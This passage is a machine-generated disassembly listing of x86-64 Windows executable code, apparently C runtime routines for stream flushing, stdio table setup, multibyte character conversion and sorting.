   14000a311:	48 8b ec             	mov    %rsp,%rbp
   14000a314:	48 83 ec 40          	sub    $0x40,%rsp
   14000a318:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   14000a31c:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000a320:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   14000a324:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000a328:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000a32c:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000a330:	48 8d 45 10          	lea    0x10(%rbp),%rax
   14000a334:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000a338:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000a33c:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000a340:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000a344:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000a348:	b8 08 00 00 00       	mov    $0x8,%eax
   14000a34d:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000a350:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000a353:	e8 d4 fe ff ff       	call   0x14000a22c
   14000a358:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   14000a35c:	8b 45 20             	mov    0x20(%rbp),%eax
   14000a35f:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   14000a363:	48 83 c4 40          	add    $0x40,%rsp
   14000a367:	5d                   	pop    %rbp
   14000a368:	c3                   	ret
   14000a369:	cc                   	int3
   14000a36a:	cc                   	int3
   14000a36b:	cc                   	int3
   14000a36c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a371:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a376:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a37b:	57                   	push   %rdi
   14000a37c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a380:	48 8b d9             	mov    %rcx,%rbx
   14000a383:	48 8b ea             	mov    %rdx,%rbp
   14000a386:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000a389:	8b c1                	mov    %ecx,%eax
   14000a38b:	24 03                	and    $0x3,%al
   14000a38d:	3c 02                	cmp    $0x2,%al
   14000a38f:	75 4e                	jne    0x14000a3df
   14000a391:	f6 c1 c0             	test   $0xc0,%cl
   14000a394:	74 49                	je     0x14000a3df
   14000a396:	8b 3b                	mov    (%rbx),%edi
   14000a398:	2b 7b 08             	sub    0x8(%rbx),%edi
   14000a39b:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   14000a39f:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   14000a3a3:	48 89 33             	mov    %rsi,(%rbx)
   14000a3a6:	85 ff                	test   %edi,%edi
   14000a3a8:	7e 35                	jle    0x14000a3df
   14000a3aa:	48 8b cb             	mov    %rbx,%rcx
   14000a3ad:	e8 06 05 00 00       	call   0x14000a8b8
   14000a3b2:	4c 8b cd             	mov    %rbp,%r9
   14000a3b5:	44 8b c7             	mov    %edi,%r8d
   14000a3b8:	48 8b d6             	mov    %rsi,%rdx
   14000a3bb:	8b c8                	mov    %eax,%ecx
   14000a3bd:	e8 e6 17 00 00       	call   0x14000bba8
   14000a3c2:	3b f8                	cmp    %eax,%edi
   14000a3c4:	74 0a                	je     0x14000a3d0
   14000a3c6:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   14000a3cb:	83 c8 ff             	or     $0xffffffff,%eax
   14000a3ce:	eb 11                	jmp    0x14000a3e1
   14000a3d0:	8b 43 14             	mov    0x14(%rbx),%eax
   14000a3d3:	c1 e8 02             	shr    $0x2,%eax
   14000a3d6:	a8 01                	test   $0x1,%al
   14000a3d8:	74 05                	je     0x14000a3df
   14000a3da:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   14000a3df:	33 c0                	xor    %eax,%eax
   14000a3e1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a3e6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a3eb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a3f0:	48 83 c4 20          	add    $0x20,%rsp
   14000a3f4:	5f                   	pop    %rdi
   14000a3f5:	c3                   	ret
   14000a3f6:	cc                   	int3
   14000a3f7:	cc                   	int3
   14000a3f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a3fd:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000a402:	55                   	push   %rbp
   14000a403:	48 8b ec             	mov    %rsp,%rbp
   14000a406:	48 83 ec 60          	sub    $0x60,%rsp
   14000a40a:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000a40f:	48 8b d9             	mov    %rcx,%rbx
   14000a412:	83 3d eb fa 00 00 00 	cmpl   $0x0,0xfaeb(%rip)        # 0x140019f04
   14000a419:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000a41d:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000a421:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000a425:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000a429:	75 10                	jne    0x14000a43b
   14000a42b:	0f 10 05 26 f3 00 00 	movups 0xf326(%rip),%xmm0        # 0x140019758
   14000a432:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000a436:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000a43b:	48 85 db             	test   %rbx,%rbx
   14000a43e:	75 0b                	jne    0x14000a44b
   14000a440:	33 c9                	xor    %ecx,%ecx
   14000a442:	e8 c5 fe ff ff       	call   0x14000a30c
   14000a447:	8b f8                	mov    %eax,%edi
   14000a449:	eb 31                	jmp    0x14000a47c
   14000a44b:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000a44f:	e8 18 ff ff ff       	call   0x14000a36c
   14000a454:	85 c0                	test   %eax,%eax
   14000a456:	74 05                	je     0x14000a45d
   14000a458:	83 cf ff             	or     $0xffffffff,%edi
   14000a45b:	eb 1f                	jmp    0x14000a47c
   14000a45d:	8b 43 14             	mov    0x14(%rbx),%eax
   14000a460:	c1 e8 0b             	shr    $0xb,%eax
   14000a463:	a8 01                	test   $0x1,%al
   14000a465:	74 13                	je     0x14000a47a
   14000a467:	48 8b cb             	mov    %rbx,%rcx
   14000a46a:	e8 49 04 00 00       	call   0x14000a8b8
   14000a46f:	8b c8                	mov    %eax,%ecx
   14000a471:	e8 82 0e 00 00       	call   0x14000b2f8
   14000a476:	85 c0                	test   %eax,%eax
   14000a478:	75 de                	jne    0x14000a458
   14000a47a:	33 ff                	xor    %edi,%edi
   14000a47c:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000a480:	75 0b                	jne    0x14000a48d
   14000a482:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000a486:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a48d:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000a491:	74 0f                	je     0x14000a4a2
   14000a493:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000a496:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000a49a:	e8 51 c1 ff ff       	call   0x1400065f0
   14000a49f:	89 58 20             	mov    %ebx,0x20(%rax)
   14000a4a2:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000a4a6:	74 0f                	je     0x14000a4b7
   14000a4a8:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000a4ab:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000a4af:	e8 3c c1 ff ff       	call   0x1400065f0
   14000a4b4:	89 58 24             	mov    %ebx,0x24(%rax)
   14000a4b7:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000a4bc:	8b c7                	mov    %edi,%eax
   14000a4be:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000a4c3:	48 83 c4 60          	add    $0x60,%rsp
   14000a4c7:	5d                   	pop    %rbp
   14000a4c8:	c3                   	ret
   14000a4c9:	cc                   	int3
   14000a4ca:	cc                   	int3
   14000a4cb:	cc                   	int3
   14000a4cc:	b1 01                	mov    $0x1,%cl
   14000a4ce:	e9 39 fe ff ff       	jmp    0x14000a30c
   14000a4d3:	cc                   	int3
   14000a4d4:	48 8b c4             	mov    %rsp,%rax
   14000a4d7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a4db:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a4df:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a4e3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a4e7:	41 56                	push   %r14
   14000a4e9:	48 83 ec 20          	sub    $0x20,%rsp
   14000a4ed:	8b 05 c5 02 01 00    	mov    0x102c5(%rip),%eax        # 0x14001a7b8
   14000a4f3:	33 db                	xor    %ebx,%ebx
   14000a4f5:	bf 03 00 00 00       	mov    $0x3,%edi
   14000a4fa:	85 c0                	test   %eax,%eax
   14000a4fc:	75 07                	jne    0x14000a505
   14000a4fe:	b8 00 02 00 00       	mov    $0x200,%eax
   14000a503:	eb 05                	jmp    0x14000a50a
   14000a505:	3b c7                	cmp    %edi,%eax
   14000a507:	0f 4c c7             	cmovl  %edi,%eax
   14000a50a:	48 63 c8             	movslq %eax,%rcx
   14000a50d:	ba 08 00 00 00       	mov    $0x8,%edx
   14000a512:	89 05 a0 02 01 00    	mov    %eax,0x102a0(%rip)        # 0x14001a7b8
   14000a518:	e8 57 cf ff ff       	call   0x140007474
   14000a51d:	33 c9                	xor    %ecx,%ecx
   14000a51f:	48 89 05 9a 02 01 00 	mov    %rax,0x1029a(%rip)        # 0x14001a7c0
   14000a526:	e8 c1 cf ff ff       	call   0x1400074ec
   14000a52b:	48 39 1d 8e 02 01 00 	cmp    %rbx,0x1028e(%rip)        # 0x14001a7c0
   14000a532:	75 2f                	jne    0x14000a563
   14000a534:	ba 08 00 00 00       	mov    $0x8,%edx
   14000a539:	89 3d 79 02 01 00    	mov    %edi,0x10279(%rip)        # 0x14001a7b8
   14000a53f:	48 8b cf             	mov    %rdi,%rcx
   14000a542:	e8 2d cf ff ff       	call   0x140007474
   14000a547:	33 c9                	xor    %ecx,%ecx
   14000a549:	48 89 05 70 02 01 00 	mov    %rax,0x10270(%rip)        # 0x14001a7c0
   14000a550:	e8 97 cf ff ff       	call   0x1400074ec
   14000a555:	48 39 1d 64 02 01 00 	cmp    %rbx,0x10264(%rip)        # 0x14001a7c0
   14000a55c:	75 05                	jne    0x14000a563
   14000a55e:	83 c8 ff             	or     $0xffffffff,%eax
   14000a561:	eb 75                	jmp    0x14000a5d8
   14000a563:	48 8b eb             	mov    %rbx,%rbp
   14000a566:	48 8d 35 cb f2 00 00 	lea    0xf2cb(%rip),%rsi        # 0x140019838
   14000a56d:	4c 8d 35 ac f2 00 00 	lea    0xf2ac(%rip),%r14        # 0x140019820
   14000a574:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   14000a578:	45 33 c0             	xor    %r8d,%r8d
   14000a57b:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000a580:	e8 ab f4 ff ff       	call   0x140009a30
   14000a585:	48 8b 05 34 02 01 00 	mov    0x10234(%rip),%rax        # 0x14001a7c0
   14000a58c:	4c 8d 05 4d fc 00 00 	lea    0xfc4d(%rip),%r8        # 0x14001a1e0
   14000a593:	48 8b d5             	mov    %rbp,%rdx
   14000a596:	48 c1 fa 06          	sar    $0x6,%rdx
   14000a59a:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000a59e:	48 8b c5             	mov    %rbp,%rax
   14000a5a1:	83 e0 3f             	and    $0x3f,%eax
   14000a5a4:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000a5a8:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000a5ac:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000a5b1:	48 83 c1 02          	add    $0x2,%rcx
   14000a5b5:	48 83 f9 02          	cmp    $0x2,%rcx
   14000a5b9:	77 06                	ja     0x14000a5c1
   14000a5bb:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000a5c1:	48 ff c5             	inc    %rbp
   14000a5c4:	49 83 c6 58          	add    $0x58,%r14
   14000a5c8:	48 83 c3 08          	add    $0x8,%rbx
   14000a5cc:	48 83 c6 58          	add    $0x58,%rsi
   14000a5d0:	48 83 ef 01          	sub    $0x1,%rdi
   14000a5d4:	75 9e                	jne    0x14000a574
   14000a5d6:	33 c0                	xor    %eax,%eax
   14000a5d8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a5dd:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a5e2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a5e7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000a5ec:	48 83 c4 20          	add    $0x20,%rsp
   14000a5f0:	41 5e                	pop    %r14
   14000a5f2:	c3                   	ret
   14000a5f3:	cc                   	int3
   14000a5f4:	40 53                	rex push %rbx
   14000a5f6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a5fa:	e8 cd fe ff ff       	call   0x14000a4cc
   14000a5ff:	e8 dc 19 00 00       	call   0x14000bfe0
   14000a604:	33 db                	xor    %ebx,%ebx
   14000a606:	48 8b 0d b3 01 01 00 	mov    0x101b3(%rip),%rcx        # 0x14001a7c0
   14000a60d:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   14000a611:	e8 7e 1a 00 00       	call   0x14000c094
   14000a616:	48 8b 05 a3 01 01 00 	mov    0x101a3(%rip),%rax        # 0x14001a7c0
   14000a61d:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   14000a621:	48 83 c1 30          	add    $0x30,%rcx
   14000a625:	ff 15 85 4a 00 00    	call   *0x4a85(%rip)        # 0x14000f0b0
   14000a62b:	48 83 c3 08          	add    $0x8,%rbx
   14000a62f:	48 83 fb 18          	cmp    $0x18,%rbx
   14000a633:	75 d1                	jne    0x14000a606
   14000a635:	48 8b 0d 84 01 01 00 	mov    0x10184(%rip),%rcx        # 0x14001a7c0
   14000a63c:	e8 ab ce ff ff       	call   0x1400074ec
   14000a641:	48 83 25 77 01 01 00 	andq   $0x0,0x10177(%rip)        # 0x14001a7c0
   14000a648:	00 
   14000a649:	48 83 c4 20          	add    $0x20,%rsp
   14000a64d:	5b                   	pop    %rbx
   14000a64e:	c3                   	ret
   14000a64f:	cc                   	int3
   14000a650:	48 83 c1 30          	add    $0x30,%rcx
   14000a654:	48 ff 25 45 4a 00 00 	rex.W jmp *0x4a45(%rip)        # 0x14000f0a0
   14000a65b:	cc                   	int3
   14000a65c:	48 83 c1 30          	add    $0x30,%rcx
   14000a660:	48 ff 25 41 4a 00 00 	rex.W jmp *0x4a41(%rip)        # 0x14000f0a8
   14000a667:	cc                   	int3
   14000a668:	40 53                	rex push %rbx
   14000a66a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a66e:	48 8b 05 73 ff 00 00 	mov    0xff73(%rip),%rax        # 0x14001a5e8
   14000a675:	48 8b da             	mov    %rdx,%rbx
   14000a678:	48 39 02             	cmp    %rax,(%rdx)
   14000a67b:	74 16                	je     0x14000a693
   14000a67d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000a683:	85 05 87 f1 00 00    	test   %eax,0xf187(%rip)        # 0x140019810
   14000a689:	75 08                	jne    0x14000a693
   14000a68b:	e8 90 f0 ff ff       	call   0x140009720
   14000a690:	48 89 03             	mov    %rax,(%rbx)
   14000a693:	48 83 c4 20          	add    $0x20,%rsp
   14000a697:	5b                   	pop    %rbx
   14000a698:	c3                   	ret
   14000a699:	cc                   	int3
   14000a69a:	cc                   	int3
   14000a69b:	cc                   	int3
   14000a69c:	40 53                	rex push %rbx
   14000a69e:	48 83 ec 20          	sub    $0x20,%rsp
   14000a6a2:	48 8d 05 3f ff 00 00 	lea    0xff3f(%rip),%rax        # 0x14001a5e8
   14000a6a9:	48 8b da             	mov    %rdx,%rbx
   14000a6ac:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000a6b0:	48 39 02             	cmp    %rax,(%rdx)
   14000a6b3:	74 16                	je     0x14000a6cb
   14000a6b5:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000a6bb:	85 05 4f f1 00 00    	test   %eax,0xf14f(%rip)        # 0x140019810
   14000a6c1:	75 08                	jne    0x14000a6cb
   14000a6c3:	e8 58 f0 ff ff       	call   0x140009720
   14000a6c8:	48 89 03             	mov    %rax,(%rbx)
   14000a6cb:	48 83 c4 20          	add    $0x20,%rsp
   14000a6cf:	5b                   	pop    %rbx
   14000a6d0:	c3                   	ret
   14000a6d1:	cc                   	int3
   14000a6d2:	cc                   	int3
   14000a6d3:	cc                   	int3
   14000a6d4:	40 53                	rex push %rbx
   14000a6d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a6da:	48 8b 05 77 f8 00 00 	mov    0xf877(%rip),%rax        # 0x140019f58
   14000a6e1:	48 8b da             	mov    %rdx,%rbx
   14000a6e4:	48 39 02             	cmp    %rax,(%rdx)
   14000a6e7:	74 16                	je     0x14000a6ff
   14000a6e9:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000a6ef:	85 05 1b f1 00 00    	test   %eax,0xf11b(%rip)        # 0x140019810
   14000a6f5:	75 08                	jne    0x14000a6ff
   14000a6f7:	e8 b8 dc ff ff       	call   0x1400083b4
   14000a6fc:	48 89 03             	mov    %rax,(%rbx)
   14000a6ff:	48 83 c4 20          	add    $0x20,%rsp
   14000a703:	5b                   	pop    %rbx
   14000a704:	c3                   	ret
   14000a705:	cc                   	int3
   14000a706:	cc                   	int3
   14000a707:	cc                   	int3
   14000a708:	40 53                	rex push %rbx
   14000a70a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a70e:	48 8d 05 43 f8 00 00 	lea    0xf843(%rip),%rax        # 0x140019f58
   14000a715:	48 8b da             	mov    %rdx,%rbx
   14000a718:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000a71c:	48 39 02             	cmp    %rax,(%rdx)
   14000a71f:	74 16                	je     0x14000a737
   14000a721:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000a727:	85 05 e3 f0 00 00    	test   %eax,0xf0e3(%rip)        # 0x140019810
   14000a72d:	75 08                	jne    0x14000a737
   14000a72f:	e8 80 dc ff ff       	call   0x1400083b4
   14000a734:	48 89 03             	mov    %rax,(%rbx)
   14000a737:	48 83 c4 20          	add    $0x20,%rsp
   14000a73b:	5b                   	pop    %rbx
   14000a73c:	c3                   	ret
   14000a73d:	cc                   	int3
   14000a73e:	cc                   	int3
   14000a73f:	cc                   	int3
   14000a740:	48 8b c4             	mov    %rsp,%rax
   14000a743:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a747:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a74b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a74f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a753:	41 56                	push   %r14
   14000a755:	48 83 ec 30          	sub    $0x30,%rsp
   14000a759:	45 33 f6             	xor    %r14d,%r14d
   14000a75c:	49 8b d9             	mov    %r9,%rbx
   14000a75f:	49 8b e8             	mov    %r8,%rbp
   14000a762:	48 8b f2             	mov    %rdx,%rsi
   14000a765:	48 8b f9             	mov    %rcx,%rdi
   14000a768:	48 85 d2             	test   %rdx,%rdx
   14000a76b:	0f 84 23 01 00 00    	je     0x14000a894
   14000a771:	4d 85 c0             	test   %r8,%r8
   14000a774:	0f 84 1a 01 00 00    	je     0x14000a894
   14000a77a:	44 38 32             	cmp    %r14b,(%rdx)
   14000a77d:	75 12                	jne    0x14000a791
   14000a77f:	48 85 c9             	test   %rcx,%rcx
   14000a782:	0f 84 13 01 00 00    	je     0x14000a89b
   14000a788:	66 44 89 31          	mov    %r14w,(%rcx)
   14000a78c:	e9 0a 01 00 00       	jmp    0x14000a89b
   14000a791:	45 38 71 28          	cmp    %r14b,0x28(%r9)
   14000a795:	75 08                	jne    0x14000a79f
   14000a797:	48 8b cb             	mov    %rbx,%rcx
   14000a79a:	e8 c1 be ff ff       	call   0x140006660
   14000a79f:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000a7a3:	44 8b 52 0c          	mov    0xc(%rdx),%r10d
   14000a7a7:	41 81 fa e9 fd 00 00 	cmp    $0xfde9,%r10d
   14000a7ae:	75 27                	jne    0x14000a7d7
   14000a7b0:	4c 8d 0d 21 00 01 00 	lea    0x10021(%rip),%r9        # 0x14001a7d8
   14000a7b7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a7bc:	4c 8b c5             	mov    %rbp,%r8
   14000a7bf:	48 8b d6             	mov    %rsi,%rdx
   14000a7c2:	48 8b cf             	mov    %rdi,%rcx
   14000a7c5:	e8 6a 19 00 00       	call   0x14000c134
   14000a7ca:	83 c9 ff             	or     $0xffffffff,%ecx
   14000a7cd:	85 c0                	test   %eax,%eax
   14000a7cf:	0f 48 c1             	cmovs  %ecx,%eax
   14000a7d2:	e9 c6 00 00 00       	jmp    0x14000a89d
   14000a7d7:	4c 39 b2 38 01 00 00 	cmp    %r14,0x138(%rdx)
   14000a7de:	75 14                	jne    0x14000a7f4
   14000a7e0:	48 85 ff             	test   %rdi,%rdi
   14000a7e3:	0f 84 a4 00 00 00    	je     0x14000a88d
   14000a7e9:	0f b6 06             	movzbl (%rsi),%eax
   14000a7ec:	66 89 07             	mov    %ax,(%rdi)
   14000a7ef:	e9 99 00 00 00       	jmp    0x14000a88d
   14000a7f4:	0f b6 0e             	movzbl (%rsi),%ecx
   14000a7f7:	48 8b 02             	mov    (%rdx),%rax
   14000a7fa:	66 44 39 34 48       	cmp    %r14w,(%rax,%rcx,2)
   14000a7ff:	7d 61                	jge    0x14000a862
   14000a801:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   14000a805:	41 83 f9 01          	cmp    $0x1,%r9d
   14000a809:	7e 2b                	jle    0x14000a836
   14000a80b:	41 3b e9             	cmp    %r9d,%ebp
   14000a80e:	7c 26                	jl     0x14000a836
   14000a810:	41 8b c6             	mov    %r14d,%eax
   14000a813:	48 85 ff             	test   %rdi,%rdi
   14000a816:	4c 8b c6             	mov    %rsi,%r8
   14000a819:	ba 09 00 00 00       	mov    $0x9,%edx
   14000a81e:	0f 95 c0             	setne  %al
   14000a821:	41 8b ca             	mov    %r10d,%ecx
   14000a824:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a828:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a82d:	e8 86 de ff ff       	call   0x1400086b8
   14000a832:	85 c0                	test   %eax,%eax
   14000a834:	75 13                	jne    0x14000a849
   14000a836:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000a83a:	48 63 48 08          	movslq 0x8(%rax),%rcx
   14000a83e:	48 3b e9             	cmp    %rcx,%rbp
   14000a841:	72 0f                	jb     0x14000a852
   14000a843:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   14000a847:	74 09                	je     0x14000a852
   14000a849:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000a84d:	8b 40 08             	mov    0x8(%rax),%eax
   14000a850:	eb 4b                	jmp    0x14000a89d
   14000a852:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000a856:	83 c8 ff             	or     $0xffffffff,%eax
   14000a859:	c7 43 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbx)
   14000a860:	eb 3b                	jmp    0x14000a89d
   14000a862:	41 8b c6             	mov    %r14d,%eax
   14000a865:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000a86b:	48 85 ff             	test   %rdi,%rdi
   14000a86e:	4c 8b c6             	mov    %rsi,%r8
   14000a871:	41 8b ca             	mov    %r10d,%ecx
   14000a874:	0f 95 c0             	setne  %al
   14000a877:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a87b:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000a87f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a884:	e8 2f de ff ff       	call   0x1400086b8
   14000a889:	85 c0                	test   %eax,%eax
   14000a88b:	74 c5                	je     0x14000a852
   14000a88d:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a892:	eb 09                	jmp    0x14000a89d
   14000a894:	4c 89 35 3d ff 00 00 	mov    %r14,0xff3d(%rip)        # 0x14001a7d8
   14000a89b:	33 c0                	xor    %eax,%eax
   14000a89d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a8a2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000a8a7:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000a8ac:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000a8b1:	48 83 c4 30          	add    $0x30,%rsp
   14000a8b5:	41 5e                	pop    %r14
   14000a8b7:	c3                   	ret
   14000a8b8:	48 83 ec 28          	sub    $0x28,%rsp
   14000a8bc:	48 85 c9             	test   %rcx,%rcx
   14000a8bf:	75 15                	jne    0x14000a8d6
   14000a8c1:	e8 8e cb ff ff       	call   0x140007454
   14000a8c6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a8cc:	e8 2b c9 ff ff       	call   0x1400071fc
   14000a8d1:	83 c8 ff             	or     $0xffffffff,%eax
   14000a8d4:	eb 03                	jmp    0x14000a8d9
   14000a8d6:	8b 41 18             	mov    0x18(%rcx),%eax
   14000a8d9:	48 83 c4 28          	add    $0x28,%rsp
   14000a8dd:	c3                   	ret
   14000a8de:	cc                   	int3
   14000a8df:	cc                   	int3
   14000a8e0:	41 54                	push   %r12
   14000a8e2:	41 55                	push   %r13
   14000a8e4:	41 56                	push   %r14
   14000a8e6:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000a8ed:	48 8b 05 4c e7 00 00 	mov    0xe74c(%rip),%rax        # 0x140019040
   14000a8f4:	48 33 c4             	xor    %rsp,%rax
   14000a8f7:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000a8fe:	00 
   14000a8ff:	4d 8b e1             	mov    %r9,%r12
   14000a902:	4d 8b f0             	mov    %r8,%r14
   14000a905:	4c 8b e9             	mov    %rcx,%r13
   14000a908:	48 85 c9             	test   %rcx,%rcx
   14000a90b:	75 1a                	jne    0x14000a927
   14000a90d:	48 85 d2             	test   %rdx,%rdx
   14000a910:	74 15                	je     0x14000a927
   14000a912:	e8 3d cb ff ff       	call   0x140007454
   14000a917:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a91d:	e8 da c8 ff ff       	call   0x1400071fc
   14000a922:	e9 a9 03 00 00       	jmp    0x14000acd0
   14000a927:	4d 85 f6             	test   %r14,%r14
   14000a92a:	74 e6                	je     0x14000a912
   14000a92c:	4d 85 e4             	test   %r12,%r12
   14000a92f:	74 e1                	je     0x14000a912
   14000a931:	48 83 fa 02          	cmp    $0x2,%rdx
   14000a935:	0f 82 95 03 00 00    	jb     0x14000acd0
   14000a93b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   14000a942:	00 
   14000a943:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   14000a94a:	00 
   14000a94b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   14000a952:	00 
   14000a953:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   14000a95a:	00 
   14000a95b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   14000a962:	00 
   14000a963:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   14000a967:	4d 0f af fe          	imul   %r14,%r15
   14000a96b:	4c 03 f9             	add    %rcx,%r15
   14000a96e:	33 c9                	xor    %ecx,%ecx
   14000a970:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a975:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000a97c:	00 00 00 00 
   14000a980:	33 d2                	xor    %edx,%edx
   14000a982:	49 8b c7             	mov    %r15,%rax
   14000a985:	49 2b c5             	sub    %r13,%rax
   14000a988:	49 f7 f6             	div    %r14
   14000a98b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000a98f:	48 83 fb 08          	cmp    $0x8,%rbx
   14000a993:	0f 87 9b 00 00 00    	ja     0x14000aa34
   14000a999:	4d 3b fd             	cmp    %r13,%r15
   14000a99c:	76 75                	jbe    0x14000aa13
   14000a99e:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   14000a9a2:	49 8b dd             	mov    %r13,%rbx
   14000a9a5:	48 8b fe             	mov    %rsi,%rdi
   14000a9a8:	49 3b f7             	cmp    %r15,%rsi
   14000a9ab:	77 2a                	ja     0x14000a9d7
   14000a9ad:	0f 1f 00             	nopl   (%rax)
   14000a9b0:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000a9b7:	b7 75 93 
   14000a9ba:	48 8b d3             	mov    %rbx,%rdx
   14000a9bd:	48 8b cf             	mov    %rdi,%rcx
   14000a9c0:	49 8b c4             	mov    %r12,%rax
   14000a9c3:	ff 15 9f 48 00 00    	call   *0x489f(%rip)        # 0x14000f268
   14000a9c9:	85 c0                	test   %eax,%eax
   14000a9cb:	48 0f 4f df          	cmovg  %rdi,%rbx
   14000a9cf:	49 03 fe             	add    %r14,%rdi
